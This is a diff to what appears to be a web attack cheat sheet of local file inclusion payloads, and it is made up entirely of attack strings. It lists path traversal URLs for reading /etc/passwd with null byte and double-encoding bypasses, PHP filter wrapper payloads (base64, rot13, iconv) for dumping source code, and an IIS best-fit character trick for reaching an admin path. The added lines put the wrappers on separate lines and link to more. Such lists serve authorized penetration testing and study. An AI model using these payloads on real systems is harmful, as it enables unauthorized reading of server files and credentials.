@@ -22,8 +22,13 @@ http://example.com/index.php?page=../../etc/passwd
 http://example.com/index.php?page=../../etc/passwd%00 
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%2500 http://example.com/index.php?page=....//....//etc/passwd 
 //Wrappers 
-http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php http://example.com/index.php?page=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp 
-
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php 
+http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php 
+http://example.com/index.php?page=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp 
+php://filter/convert.iconv.utf-8.utf-16/resource=index
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+more Wrappers here: https://chatgpt.com/share/68319239-aa40-8005-8cbe-e299dd037fc6
+    
 //IIS server with 
 /// best fit 
 	/cgi.pl/%E0dmin   -> /cgi.pl/admin 
